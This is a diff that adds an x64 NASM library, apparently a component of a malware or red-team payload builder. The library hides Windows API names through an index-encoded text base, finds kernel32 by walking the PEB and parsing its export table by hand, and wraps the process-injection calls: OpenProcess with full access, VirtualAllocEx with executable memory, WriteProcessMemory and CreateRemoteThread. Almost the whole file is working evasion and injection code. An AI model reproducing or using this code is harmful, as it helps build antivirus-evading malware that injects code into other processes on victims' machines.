@@ -1,0 +1,1015 @@
+#!name##DuckTalesLib2
+#!itemType##support
+#!info##A module containing a text base used for obfuscating called function names, loaded libraries, and more.
+#!info## It allows dynamic function imports directly from kernel32, as well as loading additional libraries and functions.
+#!info## It requires a text base that includes all letters, digits, and most special characters.
+#!info## Contains additional functions exported from the library.
+#!lang##nasm
+#!fileType##lib
+#!hiveType##lib
+#!addNameComp##True
+#!modProcess##BUILD_CODE##COMPILE
+#!modCompiler##Basic-Nasm
+#!Var##DT_Buffer##8192##Buffer for text (in bytes) used for encryption. Increase if using large text.##str
+#!foodAdd##DuckTalesText##DT_text
+#!preRT##_DUCK_TBASE##duckTable##DT_text
+
+
+bits 64
+default rel
+
+%define DUCK_TALES_TITLE_BUFFER {{DT_Buffer}}
+%define DUCK_TALES_DECRYPTED_BUFF 1024
+%define DUCK_TALES_FUNC_NAME_BUFF 128
+
+; INITIALIZE MODULE
+global DuckStartTales
+
+; RAW FUNCTIONS
+global DuckIntro
+; RAW FUNCTIONS Get Address from kernel32
+global DuckGetAddr  ; IN: decoded func name (string)
+global DuckGetKFunc ; IN: encoded func name (dword)
+; RAW FUNCTIONS Get Address function from DLL
+global DuckGetChest ; IN: decoded func name and DLL name
+global DuckGet  ; IN: encoded func name and DLL name
+; RAW FUNCTIONS Decode
+global DuckShow ; IN: encoded function name
+global DuckShow2; IN: encoded function name, buffer length, pointer to buffer
+
+; ----- EXPORT FUNCTION ---------
+global addrGetLastError
+global exeGetLastError
+global addrOpenProcess
+global exeOpenProcess
+global addrCloseHandle
+global exeCloseHandle
+global addrVirtualAllocEx
+global exeVirtualAllocEx
+global addrWriteProcessMemory
+global exeWriteProcessMemory
+global addrCreateRemoteThread
+global exeCreateRemoteThread
+global addrWaitForSingleObject
+global exeWaitForSingleObject
+global addrVirtualAlloc
+global exeVirtualAlloc
+global addrCreateThread
+global exeCreateThread
+global addrRtlMoveMemory
+global exeRtlMoveMemory
+global addrLoadLibraryA
+global exeLoadLibraryA
+global addrGetProcAddress
+global exeGetProcAddress
+global addrDisableThreadLibraryCalls
+global exeDisableThreadLibraryCalls
+global addrCreateProcessA
+global exeCreateProcessA
+
+
+extern lstrcmpA
+
+section .data
+
+
+{{ shTOOL.BuildAsmVariables("louie", DT_text)}}
+
+    
+    duck_item1: dd {{shTOOL.DigitsEncode2("LoadLibraryA", _DUCK_TBASE)}} ; LoadLibraryA
+    duck_item2: dd {{shTOOL.DigitsEncode2("GetProcAddress", _DUCK_TBASE)}} ; GetProcAddress
+
+    rb_GetLastError: dd {{shTOOL.DigitsEncode2("GetLastError", _DUCK_TBASE)}} ; GetLastError
+    rb_OpenProcess: dd {{shTOOL.DigitsEncode2("OpenProcess", _DUCK_TBASE)}} ; OpenProcess
+    rb_CloseHandle: dd  {{shTOOL.DigitsEncode2("CloseHandle", _DUCK_TBASE)}} ; CloseHandle
+    rb_VirtualAllocEx: dd {{shTOOL.DigitsEncode2("VirtualAllocEx", _DUCK_TBASE)}} ; VirtualAllocEx
+    rb_WriteProcessMemory: dd {{shTOOL.DigitsEncode2("WriteProcessMemory", _DUCK_TBASE)}} ; WriteProcessMemory
+    rb_CreateRemoteThread: dd {{shTOOL.DigitsEncode2("CreateRemoteThread", _DUCK_TBASE)}} ; CreateRemoteThread
+    rb_WaitForSingleObject: dd {{shTOOL.DigitsEncode2("WaitForSingleObject", _DUCK_TBASE)}} ; WaitForSingleObject
+    rb_VirtualAlloc: dd {{shTOOL.DigitsEncode2("VirtualAlloc", _DUCK_TBASE)}} ; VirtualAlloc
+    rb_CreateThread: dd {{shTOOL.DigitsEncode2("CreateThread", _DUCK_TBASE)}} ; CreateThread
+    rb_RtlMoveMemory: dd {{shTOOL.DigitsEncode2("RtlMoveMemory", _DUCK_TBASE)}} ; RtlMoveMemory
+    rb_DisableThreadLibraryCalls: dd {{shTOOL.DigitsEncode2("DisableThreadLibraryCalls", _DUCK_TBASE)}} ; DisableThreadLibraryCalls
+    rb_CreateProcessA: dd {{shTOOL.DigitsEncode2("CreateProcessA", _DUCK_TBASE)}}; CreateProcessA
+    
+section .bss
+    duck_k32: resq 1    ; kernel32.dll address
+    duck_exp: resq 1    ; Export Table address
+    mc_duck: resb DUCK_TALES_TITLE_BUFFER   ; buffer for text
+    duck_temp: resb DUCK_TALES_DECRYPTED_BUFF   ; buffer for decrypted text
+    duck_ftemp: resb DUCK_TALES_FUNC_NAME_BUFF
+    dowey_duck: resq 1  ; LoadLibraryA address
+    huey_duck: resq 1   ; GetProcAddress address
+
+section .text
+
+; ------------------------ EXPORT FUNCTIONS ------------------------------------------
+; ************************************************************************
+
+
+; ************************************************************************
+addrCreateProcessA:
+; CreateProcessA function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_CreateProcessA
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeCreateProcessA:
+; Creates a new process and its primary thread.
+; IN: RCX - [in, optional] lpApplicationName. The name of the module to be executed.
+; IN: RDX - [in, out, optional] lpCommandLine. The command line to be executed.
+; IN: R8 - [in] lpStartupInfo. A pointer to a STARTUPINFO or STARTUPINFOEX structure.
+; IN: R9 - [out] lpProcessInformation. A pointer to a PROCESS_INFORMATION structure that receives identification information about the new process.
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    mov [rbp-8], rcx
+    mov [rbp-16], rdx
+    mov [rbp-24], r8
+    mov [rbp-32], r9
+    
+    sub rsp, 80
+    call addrCreateProcessA
+    mov rcx, [rbp-8]
+    mov rdx, [rbp-16]
+    mov r8, 0
+    mov r9, 0
+    mov qword [rsp+32], 1
+    mov qword [rsp+40], 0
+    mov qword [rsp+48], 0
+    mov qword [rsp+56], 0
+    mov rbx, [rbp-24]
+    mov [rsp+64], rbx
+    mov rbx, [rbp-32]
+    mov [rsp+72], rbx
+    call rax
+    
+    add rsp, 32 + 80
+    pop rbp
+    ret
+
+; ************************************************************************
+addrDisableThreadLibraryCalls:
+; DisableThreadLibraryCalls function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_DisableThreadLibraryCalls
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeDisableThreadLibraryCalls:
+; Disables the DLL_THREAD_ATTACH and DLL_THREAD_DETACH notifications for the specified dynamic-link library (DLL). 
+; IN: RCX - A handle to the DLL module for which the DLL_THREAD_ATTACH and DLL_THREAD_DETACH notifications are to be disabled.
+; OUT: RAX - non zero (success) or "0" Fail
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx
+    
+    sub rsp, 32
+    call addrDisableThreadLibraryCalls
+    mov rcx, [rbp-8]
+    call rax
+    add rsp, 32 + 16
+    
+    pop rbp
+    ret
+
+; ************************************************************************
+addrGetProcAddress:
+; GetProcAddress function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, duck_item2
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeGetProcAddress:
+; Retrieves the address of an exported function (also known as a procedure) or variable from the specified dynamic-link library (DLL).
+; IN: RCX - A handle to the DLL module that contains the function or variable.
+; IN: RDX - The function or variable name, or the function's ordinal value. If this parameter is an ordinal value, it must be in the low-order word; the high-order word must be zero.
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx
+    mov [rbp-16], rdx
+    
+    sub rsp, 32
+    call addrGetProcAddress
+    mov rcx, [rbp-8]
+    mov rdx, [rbp-16]
+    call rax
+    add rsp, 32 + 16
+    
+    pop rbp
+    ret
+
+; ************************************************************************
+addrLoadLibraryA:
+; LoadLibraryA function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, duck_item1
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeLoadLibraryA:
+; Loads the specified module into the address space of the calling process.
+; IN: RCX - file name
+; OUT: RAX - module handle or "0"
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx
+    
+    sub rsp, 32
+    call addrLoadLibraryA
+    mov rcx, [rbp-8]
+    call rax
+    add rsp, 32 + 16
+    
+    pop rbp
+    ret
+      
+
+; ************************************************************************
+addrRtlMoveMemory:
+; RtlMoveMemory function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_RtlMoveMemory
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeRtlMoveMemory:
+; IN: RCX - memory address (pointer)
+; IN: RDX - Data source (pointer)
+; IN: R8 - Data size
+; OUTPUT: NO OUTPUT
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    mov [rbp-8], rcx
+    mov [rbp-16], rdx
+    mov [rbp-24], r8
+    
+    sub rsp, 32
+    call addrRtlMoveMemory
+    mov rcx, [rbp-8]
+    mov rdx, [rbp-16]
+    mov r8, [rbp-24]
+    call rax
+    
+    add rsp, 32 + 32
+    pop rbp
+    ret
+
+; ************************************************************************
+addrCreateThread:
+; CreateThread function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_CreateThread
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeCreateThread:
+; IN: RCX - Memory Address
+; IN: RDX - A pointer to a variable that receives the thread identifier or "0"
+; OUTPUT:
+; If the function succeeds, the return value is a handle to the new thread.
+; If the function fails, the return value is NULL. To get extended error information, call GetLastError.
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    mov [rbp-8], rcx
+    mov [rbp-16], rdx
+    mov [rbp-24], rbx   ; local variable
+    
+    sub rsp, 48
+    call addrCreateThread
+    mov rcx, 0
+    mov rdx, 0
+    mov r8, [rbp-8]
+    mov r9, 0
+    mov qword [rsp+32], 0
+    mov rbx, [rbp-16]
+    mov qword [rsp+40], rbx
+    call rax
+    add rsp, 48
+    
+    mov rbx, [rbp-24]   ; restore RBX
+    add rsp, 32
+    pop rbp
+    ret
+
+; ************************************************************************
+addrVirtualAlloc:
+; VirtualAlloc function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_VirtualAlloc
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+
+exeVirtualAlloc:
+; IN: RCX - memory address
+; IN: RDX - memory size
+; DEFUALT: MEM_COMMIT, MEM_RESERVE  FLAG: PAGE_EXECUTE_READWRITE
+
+; OUTPUT:
+; If the function succeeds, the return value is the base address of the allocated region of pages.
+; If the function fails, the return value is NULL. To get extended error information, call GetLastError.
+
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; mem addr
+    mov [rbp-16], rdx   ; mem size
+    
+    sub rsp, 32
+    call addrVirtualAlloc
+    mov rcx, [rbp-8]
+    mov rdx, [rbp-16]
+    mov r8, 0x00001000 | 0x00002000
+    mov r9, 0x40
+    call rax
+    
+    add rsp, 32 + 16
+    pop rbp
+    ret
+
+; ************************************************************************
+addrWaitForSingleObject:
+; WaitForSingleObject function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_WaitForSingleObject
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+    
+exeWaitForSingleObject:
+; IN: RCX - handle
+; IN: RDX - time miliseconds
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; handle
+    mov [rbp-16], rdx   ; time
+    
+    sub rsp, 32
+    call addrWaitForSingleObject
+    mov rcx, [rbp-8]
+    mov rdx, [rbp-16]
+    call rax
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+; ************************************************************************
+addrCreateRemoteThread:
+; CreateRemoteThread function address
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_CreateRemoteThread
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeCreateRemoteThread:
+; IN: RCX - process handle
+; IN: RDX - pointer to start address
+; IN: R8 - dwCreationFlags
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    mov [rbp-8], rcx    ; proc handle
+    mov [rbp-16], rdx   ; start addr
+    mov [rbp-24], r8    ; Flags
+    
+    sub rsp, 64
+    call addrCreateRemoteThread
+    mov rcx, [rbp-8]
+    xor rdx, rdx    ; lpThreadAttributes
+    xor r8, r8      ; dwStackSize
+    mov r9, [rbp-16]    ; lpStartAddress
+    mov qword [rsp+32], 0     ; lpParameter
+    mov rbx, [rbp-24]
+    mov [rsp+40], rbx    ; dwCreationFlags
+    mov qword [rsp+48], 0   ; lpThreadId
+    call rax
+    add rsp, 64
+    
+    
+    add rsp, 32
+    pop rbp
+    ret
+
+
+
+; ************************************************************************
+addrWriteProcessMemory:
+; WriteProcessMemory address function
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_WriteProcessMemory
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+    
+    
+exeWriteProcessMemory:
+; IN: RCX - process handle
+; IN: RDX - pointer to base address
+; IN: R8 - pointer to buffer
+; IN: R9 - size of bytes to write
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    mov [rbp-8], rcx    ; proc handle
+    mov [rbp-16], rdx   ; pointer base addr
+    mov [rbp-24], r8    ; pointer to buffer
+    mov [rbp-32], r9    ; bytes size
+    
+    sub rsp, 48
+    call addrWriteProcessMemory
+    mov rcx, [rbp-8]    ; proc handle
+    mov rdx, [rbp-16]
+    mov r8, [rbp-24]
+    mov r9, [rbp-32]
+    mov qword [rsp+32], 0
+    call rax
+    
+    add rsp, 48
+    
+    add rsp, 32
+    pop rbp
+    ret
+    
+
+
+; ************************************************************************
+addrVirtualAllocEx:
+; VirtualAllocEx address function
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_VirtualAllocEx
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeVirtualAllocEx:
+; Executes the function: 'VirtualAllocEx' with the parameter: 'MEM_COMMIT' , 'MEM_RESERVE'
+; IN: RCX - process handle
+; IN: RDX - size
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; save process handle
+    mov [rbp-16], rdx   ; save size of memory
+    
+    sub rsp, 48
+    call addrVirtualAllocEx
+    mov rcx, [rbp-8]    ; proc handle
+    xor rdx, rdx    ; lpAddress
+    mov r8, [rbp-16]    ; size
+    mov r9, 0x00001000 | 0x00002000     ; MEM_COMMIT | MEM_RESERVE
+    mov qword [rsp+32], 0x40    ; flProtect = PAGE_EXECUTE_READWRITE
+    call rax
+    add rsp, 48 + 16
+    
+    pop rbp
+    ret
+    
+; ************************************************************************
+addrCloseHandle:
+; CloseHandle address function
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_CloseHandle
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret 
+
+exeCloseHandle:
+; IN - handle object
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; save handle
+    
+    sub rsp, 32
+    call addrCloseHandle
+    mov rcx, [rbp-8]
+    call rax
+    add rsp, 32 + 16
+    
+    pop rbp
+    ret
+
+; ************************************************************************
+
+addrOpenProcess:
+; OpenProcess address function
+; 0x1F0FFF
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_OpenProcess
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret 
+
+exeOpenProcess:
+; IN: rcx - PID process
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; save PID
+    
+    sub rsp, 32
+    call addrOpenProcess
+    
+    mov rcx, 0x1F0FFF   ; PROCESS ALL ACCESS
+    mov rdx, 0
+    mov r8, [rbp-8]
+    call rax
+    add rsp, 32 + 16
+    
+    pop rbp
+    ret
+
+
+; ************************************************************************
+addrGetLastError:
+; GetLastError address function
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    mov rcx, rb_GetLastError
+    call DuckGetKFunc
+    add rsp, 32
+    
+    pop rbp
+    ret
+
+exeGetLastError:
+; Execute GetLastError
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 32
+    call addrGetLastError
+    call rax
+    add rsp, 32
+    
+    pop rbp
+    ret
+    
+; ************************************************************************
+
+; -----------------------------------------------------------------------------------------
+
+DuckIntro:
+; return pointer to text database
+; OUT: rax - pointer to text database
+    push rbp
+    mov rbp, rsp
+    
+    lea rax, [mc_duck]
+    
+    pop rbp
+    ret
+  
+DuckGet:
+; Get function address from kernel32 or other library
+; IN: rcx - encoded function name
+; IN: rdx - encoded DLL name or 0 (kernel32)
+; OUT: rax - function address or 0
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; encoded func name
+    mov [rbp-16], rdx   ; encoeded dll name
+    push rsi
+    push rdi
+    
+    cmp rdx, 0
+    je .kernel_load
+    
+    
+    ; decode DLL name
+    sub rsp, 40
+    mov rcx, [rbp-16]
+    mov rdx, DUCK_TALES_FUNC_NAME_BUFF
+    lea r8, [duck_ftemp]
+    call DuckShow2
+    ; decode func name
+    mov rcx, [rbp-8]
+    call DuckShow
+    ; load DLL and get function address
+    mov rcx, rax
+    lea rdx, [duck_ftemp]
+    call DuckGetChest
+    add rsp, 40
+      
+    
+    .return:
+        pop rdi
+        pop rsi
+        add rsp, 24
+        pop rbp
+        ret
+
+    .kernel_load:
+        sub rsp, 40
+        call DuckGetKFunc
+        add rsp, 40
+        jmp .return
+        
+
+
+
+
+
+DuckGetChest:
+; Load DLL and get function address
+; IN: rcx - function name
+; IN: rdx - DLL name
+; OUT: rax - function address or 0
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx   ; function name
+    mov [rbp-16], rdx   ; dll name
+    
+    
+    ; load DLL
+    sub rsp, 32
+    mov rcx, rdx
+    lea rax, [dowey_duck]
+    mov rax, [rax]
+    call rax    ; call LoadLibraryA
+
+    cmp rax, 0
+    je .error
+    
+    ; get function address
+    mov rcx, rax
+    mov rdx, [rbp-8]
+    lea rax, [huey_duck]
+    mov rax, [rax]
+    call rax    ; call GetProcAddress
+    cmp rax, 0
+    je .error
+    
+    .return:
+        add rsp, 16 + 32
+        pop rbp
+        ret
+
+    .error:
+        xor rax, rax    ;return 0
+        jmp .return
+
+DuckStartTales:
+; Initialize module
+    push rbp
+    mov rbp, rsp
+    sub rsp, 48
+    
+    ; Find kernel32
+    call OpenTreasury
+    
+    ; build text data base
+    call PrepareTale
+    
+    ; get LoadLibraryA address
+    mov rcx, duck_item1
+    call DuckGetKFunc
+    lea rcx, [dowey_duck]
+    mov [rcx], rax  ; save address
+    
+    ; get GetProcAddress address
+    mov rcx, duck_item2
+    call DuckGetKFunc
+    lea rcx, [huey_duck]
+    mov [rcx], rax  ; save address
+     
+    add rsp, 48
+    pop rbp
+    ret
+
+DuckGetKFunc:
+; get function address from kernel32
+; IN: rcx - encoded function name. (dword list)
+; OUT: rax - function address or 0
+    push rbp
+    mov rbp, rsp
+    
+    sub rsp, 48
+    call DuckShow
+    mov rcx, rax
+    call DuckGetAddr
+    add rsp, 48
+    
+    pop rbp
+    ret
+    
+
+
+DuckGetAddr:
+; get function address from kernel32
+; IN: rcx - function name
+; OUT: rax - function address
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    push r12
+    push r13
+    push rsi
+    push rdi
+    push rbx
+    mov [rbp-8], rcx    ; function name
+    
+    lea rbx, [duck_k32]
+    mov rbx, [rbx]  ; RBX - kernel32 address
+    lea rsi, [duck_exp]
+    mov rsi, [rsi]     ; RSI - Export Table address
+    xor r12, r12    ; R12 - counter
+    mov r13d, [rsi+0x14]    ; Number of Function
+    
+    .loop:
+        cmp r12, r13    ; check func limit
+        jg .not_find
+        ; get function name
+        mov edx, [rsi+0x20]     ; RVA function name table
+        add rdx, rbx    ; RVA func name table + VA kernel32
+        mov edx, [rdx + 4 * r12]    ; get next entry RVA function name
+        add rdx, rbx    ; RVA func name + VA kernel32
+        
+        ; compare function name
+        sub rsp, 40
+        mov rcx, [rbp-8]
+        call lstrcmpA
+        add rsp, 40
+        cmp rax, 0
+        je .finded
+        inc r12 ; counter + 1
+        jmp .loop
+    
+    .finded:
+        mov edx, [rsi+0x24] ; get RVA AddressOfNameOrdinals (dword)
+        add rdx, rbx    ; RVA name ordinals + VA kernel32
+        xor rcx, rcx
+        mov cx, [rdx + 2 * r12]     ; get function index to function address (word)
+        mov edx, [rsi+0x1c]     ; get RVA table 'AddressOfFunctions'
+        add rdx, rbx    ; RVA table + VA kernel32
+        mov edx, [rdx + 4 * rcx]    ; get RVA function address
+        add rdx, rbx    ; RVA func addr + VA kernel32
+        ; return function address
+        mov rax, rdx
+    
+    .return:
+        pop rbx
+        pop rdi
+        pop rsi
+        pop r13
+        pop r12
+        add rsp, 16
+        pop rbp
+        ret
+     
+    .not_find:
+        xor rax, rax    ; return 0
+        jmp .return
+    
+    
+
+
+DuckShow2:
+; decrypt function name
+; IN: rcx - encrypted func name (dword)
+; IN: rdx - buffer length
+; IN: r8 - pointer to buffer
+; OUT: rax - pointer to buffer
+    push rbp
+    mov rbp, rsp
+    sub rsp, 32
+    mov [rbp-8], rcx    ; encrypted function name
+    mov [rbp-16], rdx   ; buffer length
+    mov [rbp-24], r8    ; pointer to buffer
+    push rsi
+    push rdi
+    
+    ;clear buffer
+    xor rax, rax
+    xor rcx, rcx
+    mov rdi, r8     ; pointer to buffer
+    mov rcx, [rbp-16]   ; buff len
+    mov byte al, 0
+    cld
+    rep stosb
+    
+    xor rdx, rdx    ; main index
+    mov rsi, [rbp-8]    ; encrypted func name
+    mov rdi, [rbp-24]
+    lea rcx, [mc_duck]  ; text data
+    xor rax, rax    ; temp
+    xor r8, r8  ; temp for index
+    .decode:
+        mov r8d, [rsi + 4 * rdx]     ; get char index from encrypted function name
+        cmp r8d, 0
+        je .return
+        mov byte al, [rcx + r8]     ; get char from text database
+        mov byte [rdi + rdx], al    ; put char in output buffer
+        inc rdx     ; index + 1
+        jmp .decode
+    
+    .return:
+        mov rax, [rbp-24]
+        pop rdi
+        pop rsi
+        add rsp, 32
+        pop rbp
+        ret
+
+DuckShow:
+; decrypt function name
+; IN: rcx - encrypted func name (dword)
+; OUT: rax - pointer to decrypted func name
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; encrypted function name
+    push rdi
+    push rsi
+    
+    ; clear buffer
+    xor rax, rax
+    mov rcx, DUCK_TALES_DECRYPTED_BUFF
+    lea rdi, [duck_temp]
+    mov byte al, 0
+    cld
+    rep stosb
+    
+    xor rdx, rdx    ; main index
+    mov rsi, [rbp-8]    ; encrypted func name
+    lea rdi, [duck_temp]
+    lea rcx, [mc_duck]  ; text data
+    xor rax, rax    ; temp
+    xor r8, r8  ; temp for index
+    .decode:
+        mov r8d, [rsi + 4 * rdx]     ; get char index from encrypted function name
+        cmp r8d, 0
+        je .return
+        mov byte al, [rcx + r8]     ; get char from text database
+        mov byte [rdi + rdx], al    ; put char in output buffer
+        inc rdx     ; index + 1
+        jmp .decode
+    
+    .return:
+        lea rax, [duck_temp]    ; return pointer
+        pop rsi
+        pop rdi
+        add rsp, 16
+        pop rbp
+        ret
+    
+    
+PrepareTale:
+; combines parts of text into one text
+
+    push rbp
+    mov rbp, rsp
+    push rbx
+    
+    lea rax, mc_duck
+    lea rbx, louie_all
+    xor rcx, rcx    ; mc_duck counter
+    xor r9, r9  ; mc_duck byte index
+    xor rdx, rdx
+    .main_copy:
+        mov rdx, [rbx + 8 * rcx]
+        ; check end of struct 
+        cmp rdx, 0
+        je .return
+        xor rsi, rsi
+        xor rdi, rdi
+        .copy_var:
+            mov byte dil, [rdx + rsi]
+            cmp dil, 0
+            je .end_var
+            mov byte [rax + r9], dil    ; put bytes in mc_duck
+            inc r9  ; mc_duck byte index + 1
+            inc rsi ; var index + 1
+            jmp .copy_var
+    
+    .return:
+        pop rbx
+        pop rbp
+        ret   
+
+    .end_var:
+        inc rcx ; mc_duck counter + 1
+        jmp .main_copy 
+
+OpenTreasury:
+; find kernel32 and export table address
+
+    push rbp
+    mov rbp, rsp
+    push rbx    ; save rbx
+    push rsi    ; save rsi
+    push rdi    ; save rdi
+   
+    xor rbx, rbx
+    mov rbx, gs:[0x60]  ; Get address of PEB struct
+    mov rbx, [rbx+0x18] ; Get PEB_LDR_DATA address
+    mov rbx, [rbx+0x20] ; Get InMemoryOrderModuleList
+    mov rbx, [rbx]  ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rbx, [rbx]  ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov rsi, [rbx+0x20]  ; Get kernel32.dll address
+    lea rdi, [duck_k32]
+    mov [rdi], rsi  ; save kernel32.dll address
+    
+    xor rdi, rdi
+    mov edi, [rsi + 0x3c]   ; RVA PE file signature
+    add rdi, rsi    ; RVA PE + kernel32 addr
+    add rdi, 0x88   ; 0x88 bytes after the PE signature is the RVA for the Export Table
+    mov edi, [rdi]  ; get RVA Export Table
+    add rdi, rsi    ; RVA Export Table + kernel32 address
+    lea rbx, [duck_exp]
+    mov [rbx], rdi  ; save Export Table address
+    ; restore registry
+    pop rdi
+    pop rsi
+    pop rbx
+    pop rbp
+    ret
+
+
